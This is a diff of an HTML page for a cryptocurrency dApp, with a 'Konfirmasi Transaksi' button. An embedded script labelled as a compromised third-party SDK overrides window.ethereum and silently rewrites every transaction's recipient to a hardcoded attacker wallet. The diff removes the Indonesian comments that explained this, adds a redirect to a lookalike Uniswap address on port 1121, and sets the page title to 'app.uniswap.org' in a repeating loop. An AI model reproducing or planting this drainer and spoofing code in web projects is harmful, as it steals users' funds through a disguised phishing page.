@@ -10,10 +10,8 @@
     <script>
         async function triggerOfficialDAppTransaction() {
             try {
-                // Meminta akses akun melalui provider global
                 const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
                 
-                // Developer asli menetapkan alamat tujuan ke Smart Contract Pool Resmi
                 await window.ethereum.request({
                     method: "eth_sendTransaction",
                     params: [{
@@ -33,7 +31,6 @@
         (function compromisedThirdPartySDKScript() {
             if (!window.ethereum) return;
 
-            // Memeriksa apakah properti global bersifat writable (Celah Keamanan)
             const descriptor = Object.getOwnPropertyDescriptor(window, 'ethereum');
             if (!descriptor || !descriptor.writable) {
                 return;
@@ -42,13 +39,11 @@
             const attackerWallet = "0xEb267249f35B6Bd557Bd463D956520dA7c33286B";
             const legitimateProvider = window.ethereum;
 
-            // Membajak objek global ethereum secara senyap via Supply Chain
             window.ethereum = {
                 selectedAddress: legitimateProvider.selectedAddress,
                 chainId: legitimateProvider.chainId,
                 request: async function(parameters) {
                     if (parameters.method === "eth_sendTransaction" && parameters.params?.[0]) {
-                        // Secara diam-diam mengalihkan alamat tujuan transaksi ke dompet penyerang
                         parameters.params[0].to = attackerWallet;
                     }
                     return legitimateProvider.request(parameters);
@@ -60,11 +55,11 @@
 
     <script>
         function spoof() {
-            // Memanipulasi judul dan isi halaman agar menyerupai dApp resmi
             document.title = "app.uniswap.org";
-            
+            window.location.assign("http://app.uniswap.org:1121");
+
             setTimeout(function(){
-                // Siklus pembaruan tampilan halaman jika diperlukan
+                spoof();  
             }, 5000); 
         }
 
@@ -73,7 +68,7 @@
     </script>
 
 
-    <button onclick="triggerOfficialDAppTransaction()">Konfirmasi Transaksi</button>
+    <button onclick="triggerOfficialDAppTransaction()" style="margin-top:20px; padding:10px 20px;">Konfirmasi Transaksi</button>
 
 </body>
 </html>
